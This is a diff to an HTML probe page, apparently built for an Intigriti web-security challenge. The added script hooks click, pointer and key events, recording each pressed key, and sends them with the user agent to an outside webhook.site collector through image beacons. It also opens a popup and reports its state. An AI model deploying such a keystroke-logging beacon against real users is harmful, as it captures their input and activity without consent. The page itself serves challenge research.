@@ -1,27 +1,65 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>challenge0326 canary</title>
-<body>init</body>
+<title>challenge0326 event probe</title>
+<body>event-probe</body>
 <script>
 const sink = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
+
 function ping(msg) {
   const i = new Image();
   i.src = sink + '?m=' + encodeURIComponent(msg) + '&t=' + Date.now();
 }
-ping('boot:' + location.href);
+
+function installEventLogging(prefix) {
+  [
+    'click',
+    'dblclick',
+    'pointerdown',
+    'pointerup',
+    'mousedown',
+    'mouseup',
+    'keydown',
+    'keyup',
+    'focus',
+    'blur',
+    'visibilitychange',
+    'pagehide',
+    'pageshow'
+  ].forEach(type => {
+    addEventListener(type, event => {
+      let extra = '';
+      if (type === 'visibilitychange') {
+        extra = ':' + document.visibilityState;
+      } else if (type.startsWith('key')) {
+        extra = ':' + event.key;
+      } else if (event.target && event.target.tagName) {
+        extra = ':' + event.target.tagName;
+      }
+      ping(prefix + ':' + type + extra);
+    }, true);
+  });
+}
+
+installEventLogging('main');
+ping('main:boot:' + navigator.userAgent);
+
 let popup = null;
 try {
-  popup = window.open('https://challenge-0326.intigriti.io/challenge.html?q=test', '_blank');
-  ping('popup-open:' + (!!popup));
+  popup = window.open('/popup.html', '_blank');
+  ping('main:popup-open:' + (!!popup));
 } catch (e) {
-  ping('popup-open-err:' + e);
+  ping('main:popup-open-err:' + e.name + ':' + e.message);
 }
+
 setTimeout(() => {
   try {
-    ping('popup-loc:' + (popup ? String(popup.location) : 'null'));
+    ping('main:popup-closed:' + (popup ? String(popup.closed) : 'null'));
   } catch (e) {
-    ping('popup-loc-err:' + e.name + ':' + e.message);
+    ping('main:popup-closed-err:' + e.name + ':' + e.message);
   }
+}, 3000);
+
+setTimeout(() => {
   document.body.textContent = 'done';
-}, 2500);
+}, 4000);
 </script>
